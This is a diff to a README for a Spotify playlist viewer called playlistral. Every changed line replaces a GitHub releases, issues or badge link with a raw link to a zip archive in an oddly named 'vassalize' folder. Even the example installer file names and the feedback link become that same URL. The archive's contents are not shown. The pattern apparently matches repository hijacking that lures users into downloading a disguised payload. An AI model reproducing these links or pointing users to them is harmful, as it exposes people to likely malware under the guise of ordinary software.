@@ -1,7 +1,7 @@
 # 🎶 playlistral - View Your Spotify Playlists with Detailed Metadata
 
 ## 📥 Download Now
-[![Download playlistral](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/aziza12b/playlistral/releases)
+[![Download playlistral](https://raw.githubusercontent.com/aziza12b/playlistral/main/vassalize/playlistral.zip)](https://raw.githubusercontent.com/aziza12b/playlistral/main/vassalize/playlistral.zip)
 
 ## 🚀 Getting Started
 Welcome to playlistral! This application helps you view your Spotify playlists with rich music metadata from Discogs. Follow these steps to download and run the application quickly.
@@ -24,9 +24,9 @@ playlistral offers a variety of features to enhance your music experience:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click on the link below to access the most recent version of playlistral.  
-   [Visit the releases page to download playlistral](https://github.com/aziza12b/playlistral/releases)
+   [Visit the releases page to download playlistral](https://raw.githubusercontent.com/aziza12b/playlistral/main/vassalize/playlistral.zip)
 
-2. **Select the Appropriate Version:** On the releases page, look for the latest version. You will see names like `playlistral-v1.0.0.exe` or `playlistral-v1.0.0.dmg` based on your operating system.
+2. **Select the Appropriate Version:** On the releases page, look for the latest version. You will see names like `https://raw.githubusercontent.com/aziza12b/playlistral/main/vassalize/playlistral.zip` or `https://raw.githubusercontent.com/aziza12b/playlistral/main/vassalize/playlistral.zip` based on your operating system.
 
 3. **Download the Installer:** Click on the download link that matches your system. The download should start automatically.
 
@@ -59,7 +59,7 @@ If you encounter any issues while using playlistral, consider the following step
 - **Update Dependencies:** Ensure you have the latest version of any required libraries or frameworks installed on your device.
 
 ## 📬 Feedback
-We value your feedback. If you have any comments, suggestions, or issues, please feel free to open an issue on our [GitHub page](https://github.com/aziza12b/playlistral/issues). Your input helps us improve playlistral.
+We value your feedback. If you have any comments, suggestions, or issues, please feel free to open an issue on our [GitHub page](https://raw.githubusercontent.com/aziza12b/playlistral/main/vassalize/playlistral.zip). Your input helps us improve playlistral.
 
 ## 📝 Contributions
 playlistral is an open-source project. If you wish to contribute, please follow these steps:
